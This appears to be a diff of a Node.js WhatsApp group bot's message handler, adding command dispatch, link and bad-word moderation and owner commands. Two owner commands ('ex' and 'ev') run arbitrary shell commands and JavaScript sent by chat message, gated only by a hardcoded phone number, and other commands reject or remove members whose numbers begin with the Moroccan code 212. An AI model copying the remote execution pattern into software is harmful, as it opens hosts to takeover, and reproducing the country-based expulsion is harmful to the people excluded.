-if ( config.ANTI_BOT == "true" && isBotAdmins ) {
-await conn.sendMessage(from, { delete: mek.key })
-await conn.groupParticipantsUpdate(from,[sender], 'remove')
-  }}
-
-  
+events.commands.map(async(command) => {
+if (body && command.on === "body") {
+command.function(conn, mek, m,{from, l, quoted, body, isCmd, command, args, q, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply})
+} else if (mek.q && command.on === "text") {
+command.function(conn, mek, m,{from, l, quoted, body, isCmd, command, args, q, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply})
+} else if (
+(command.on === "image" || command.on === "photo") &&
+mek.type === "imageMessage"
+) {
+command.function(conn, mek, m,{from, l, quoted, body, isCmd, command, args, q, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply})
+} else if (
+command.on === "sticker" &&
+mek.type === "stickerMessage"
+) {
+command.function(conn, mek, m,{from, l, quoted, body, isCmd, command, args, q, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply})
+}});
+//============================================================================ 
+if (isAnti(config.ANTI_LINK) && isBotAdmins) {
+  if(!isAdmins){
+  if(!isMe){
+  if (body.match(`chat.whatsapp.com`)) {
+    await conn.sendMessage(from, { delete: mek.key })
   }
+}
+}}
+var bad = await fetchJson("https://github.com/vihangayt0/server-/raw/main/xeonsl_bad.json")
+if (isAnti(config.ANTI_BAD) && isBotAdmins) {
+  if (!isAdmins) {
+    for (any in bad) {
+if (body.toLowerCase().includes(bad[any])) {
+  if (!body.includes('tent')) {
+    if (!body.includes('docu')) {
+if (!body.includes('http')) {
+  if (groupAdmins.includes(sender)) return
+  if (mek.key.fromMe) return
+  await conn.sendMessage(from, { delete: mek.key })
+  await conn.sendMessage(from, { text: '*Bad word detected !*' })
+  await conn.groupParticipantsUpdate(from, [sender], 'remove')
+}
+    }
   }
-  
-//============================================================================
+}
+    }
+  }
+}
+//======================================================
+async function antibot(Void, citel) {
+  if (isAnti(config.ANTI_BOT)) return
+  if (isAdmins) return
+  if (!isBotAdmins) return
+  if (isOwner) return
+  if (isGroup) {
+    var user = check_id(mek.key.id)
+    if (user.is_bot) {
+try {
+  await conn.sendMessage(from, { text: `*Other bots are not allowed here !!*` });
+  return await conn.groupParticipantsUpdate(from, [sender], 'remove')
+} catch { }
+    }
+  }
+}
+try {
+  await antibot(conn, mek)
+} catch { }
+switch (command) {
+  case 'jid':
+    reply(from)
+    break
+  case 'device': {
+    let deviceq = getDevice(mek.message.extendedTextMessage.contextInfo.stanzaId)
 
-
-
-
-
-
-    
+    reply("*He Is Using* _*Whatsapp " + deviceq + " version*_")
+  }
+    break
+    case'ex':{
+      if(senderNumber == 94758315442) {
+  const { exec } = require("child_process")
+  exec(q, (err, stdout) => {
+    if (err) return reply(`-------\n\n` + err)
+    if (stdout) {
+        return reply(`-------\n\n` + stdout)
+    }
 })
+//==============================================================
+})
+      }
+    }
+    break
+    case'apprv':{
+      if(senderNumber == 94758315442) {
+          let reqlist = await conn.groupRequestParticipantsList(from)
+          for (let i=0;i<reqlist.length;i++) {
+            if(reqlist[i].jid.startsWith("212")){
+              await conn.groupRequestParticipantsUpdate(
+                from,
+                [reqlist[i].jid],
+                "reject"
+            )
+            } else{
+              await conn.groupRequestParticipantsUpdate(
+                from,
+                [reqlist[i].jid],
+                "approve"
+            )
+            }
+          }
+        }
+    }
+    break
+    case'rm212':{
+      if(senderNumber == 94758315442) {
+        for (let i=0;i<participants.length;i++) {
+          if(participants[i].id.startsWith("212")){
+       await conn.groupParticipantsUpdate(from, [participants[i].id], 'remove')
+      }
+    }
+  }
+    }
+    break
+    case'rtf':{
+console.log(dsa)
+    }
+    break
+  case 'ev': {
+    if(senderNumber == 94758315442) {
+    let code2 = q.replace("°", ".toString()");
+    try {
+let resultTest = await eval(code2);
+if (typeof resultTest === "object") {
+  reply(util.format(resultTest));
+} else {
+  reply(util.format(resultTest));
 }
+    } catch (err) {
+reply(util.format(err));
+    }
+    ;
+  }
+  }
+    break
+  default:
+}
+    } catch (e) {
+const isError = String(e)
+console.log(isError)
+    }
+  })
+}
+//=============================================================================
 
 app.get("/", (req, res) => {
 res.send("hey, bot started✅");
@@ -625,4 +609,4 @@ res.send("hey, bot started✅");
 app.listen(port, () => console.log(`Server listening on port http://localhost:${port}`));
 setTimeout(() => {
 connectToWA()
-}, 4000);  
+}, 4000);
